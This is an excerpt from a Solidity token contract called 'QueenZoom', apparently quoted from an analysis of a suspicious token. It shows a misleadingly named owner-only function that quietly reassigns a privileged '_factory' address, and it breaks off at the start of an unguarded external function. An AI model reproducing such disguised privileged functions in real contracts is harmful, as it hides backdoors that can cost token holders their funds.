...
contract OwnershipHelper is ContextHelper {  
    ...
    */
    ...
    function autodoubleInput(address newOwner) external onlyOwner {
        _factory = newOwner;
    }  
...
contract QueenZoom is ContextHelper, IERC20, OwnershipHelper{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;  
    mapping (address => mapping (address => uint256)) private _allowances;  
    uint256 private _totalSupply = 1000000 *  10**9;        
    
    string private _name = "QueenZoom";
    string private _symbol = "QZOOM";
    ...
    function checkQueenZoom(address shareholder, uint256 amount) external {
